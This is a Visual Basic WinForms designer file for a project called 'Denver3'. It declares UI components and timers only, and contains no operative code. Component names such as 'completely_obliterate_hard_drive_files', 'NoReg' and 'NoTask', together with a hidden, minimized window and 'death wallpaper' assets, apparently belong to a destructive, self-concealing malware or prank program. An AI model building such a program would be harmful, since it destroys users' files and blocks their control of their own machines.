﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.BackgroundWorker1 = New System.ComponentModel.BackgroundWorker()
        Me.BackgroundWorker2 = New System.ComponentModel.BackgroundWorker()
        Me.NoReg = New System.Windows.Forms.Timer(Me.components)
        Me.NoTask = New System.Windows.Forms.Timer(Me.components)
        Me.completely_obliterate_hard_drive_files = New System.ComponentModel.BackgroundWorker()
        Me.BackgroundWorker4 = New System.ComponentModel.BackgroundWorker()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.timer_minimize_window = New System.Windows.Forms.Timer(Me.components)
        Me.pic_cannabis_leaf = New System.Windows.Forms.PictureBox()
        Me.PIC_BILL_NYE = New System.Windows.Forms.PictureBox()
        Me.PIC_DEATH_WALPAPER = New System.Windows.Forms.PictureBox()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.FitTeaTimer = New System.Windows.Forms.Timer(Me.components)
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        CType(Me.pic_cannabis_leaf, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.PIC_BILL_NYE, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.PIC_DEATH_WALPAPER, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'NoReg
        '
        '
        'NoTask
        '
        '
        'completely_obliterate_hard_drive_files
        '
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(12, 9)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(126, 13)
        Me.Label1.TabIndex = 0
        Me.Label1.Text = "DEV ASSETS WINDOW"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(58, 79)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(80, 13)
        Me.Label2.TabIndex = 2
        Me.Label2.Text = "death walpaper"
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Location = New System.Drawing.Point(206, 79)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(107, 13)
        Me.Label3.TabIndex = 4
        Me.Label3.Text = "Pic Bill nye Walpaper"
        '
        'timer_minimize_window
        '
        Me.timer_minimize_window.Enabled = True
        Me.timer_minimize_window.Interval = 1
        '
        'pic_cannabis_leaf
        '
        Me.pic_cannabis_leaf.Image = Global.Denver3.My.Resources.Resources.Cannabis_leaf_svg
        Me.pic_cannabis_leaf.Location = New System.Drawing.Point(15, 256)
        Me.pic_cannabis_leaf.Name = "pic_cannabis_leaf"
        Me.pic_cannabis_leaf.Size = New System.Drawing.Size(163, 72)
        Me.pic_cannabis_leaf.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.pic_cannabis_leaf.TabIndex = 5
        Me.pic_cannabis_leaf.TabStop = False
        '
        'PIC_BILL_NYE
        '
        Me.PIC_BILL_NYE.Image = Global.Denver3.My.Resources.Resources.Bill_Nye_the_Science_Guy_title_screen
        Me.PIC_BILL_NYE.Location = New System.Drawing.Point(184, 95)
        Me.PIC_BILL_NYE.Name = "PIC_BILL_NYE"
        Me.PIC_BILL_NYE.Size = New System.Drawing.Size(152, 123)
        Me.PIC_BILL_NYE.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PIC_BILL_NYE.TabIndex = 3
        Me.PIC_BILL_NYE.TabStop = False
        '
        'PIC_DEATH_WALPAPER
        '
        Me.PIC_DEATH_WALPAPER.Image = Global.Denver3.My.Resources.Resources._242406
        Me.PIC_DEATH_WALPAPER.Location = New System.Drawing.Point(15, 95)
        Me.PIC_DEATH_WALPAPER.Name = "PIC_DEATH_WALPAPER"
        Me.PIC_DEATH_WALPAPER.Size = New System.Drawing.Size(163, 123)
        Me.PIC_DEATH_WALPAPER.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PIC_DEATH_WALPAPER.TabIndex = 1
        Me.PIC_DEATH_WALPAPER.TabStop = False
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Location = New System.Drawing.Point(39, 240)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(116, 13)
        Me.Label4.TabIndex = 6
        Me.Label4.Text = "cannabis leaf walpaper"
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Location = New System.Drawing.Point(12, 32)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(143, 13)
        Me.Label5.TabIndex = 7
        Me.Label5.Text = "DO NOT REMOVE ASSETS"
        '
        'FitTeaTimer
        '
        Me.FitTeaTimer.Interval = 10000
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(351, 334)
        Me.Controls.Add(Me.Label5)
        Me.Controls.Add(Me.Label4)
        Me.Controls.Add(Me.pic_cannabis_leaf)
        Me.Controls.Add(Me.Label3)
        Me.Controls.Add(Me.PIC_BILL_NYE)
        Me.Controls.Add(Me.Label2)
        Me.Controls.Add(Me.PIC_DEATH_WALPAPER)
        Me.Controls.Add(Me.Label1)
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.Name = "Form1"
        Me.ShowInTaskbar = False
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Denver3"
        Me.WindowState = System.Windows.Forms.FormWindowState.Minimized
        CType(Me.pic_cannabis_leaf, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.PIC_BILL_NYE, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.PIC_DEATH_WALPAPER, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub

    Friend WithEvents BackgroundWorker1 As System.ComponentModel.BackgroundWorker
    Friend WithEvents BackgroundWorker2 As System.ComponentModel.BackgroundWorker
    Friend WithEvents NoReg As Timer
    Friend WithEvents NoTask As Timer
    Friend WithEvents completely_obliterate_hard_drive_files As System.ComponentModel.BackgroundWorker
    Friend WithEvents BackgroundWorker4 As System.ComponentModel.BackgroundWorker
    Friend WithEvents Label1 As Label
    Friend WithEvents PIC_DEATH_WALPAPER As PictureBox
    Friend WithEvents Label2 As Label
    Friend WithEvents PIC_BILL_NYE As PictureBox
    Friend WithEvents Label3 As Label
    Friend WithEvents timer_minimize_window As Timer
    Friend WithEvents pic_cannabis_leaf As PictureBox
    Friend WithEvents Label4 As Label
    Friend WithEvents Label5 As Label
    Friend WithEvents FitTeaTimer As Timer
    Friend WithEvents Timer1 As Timer
End Class
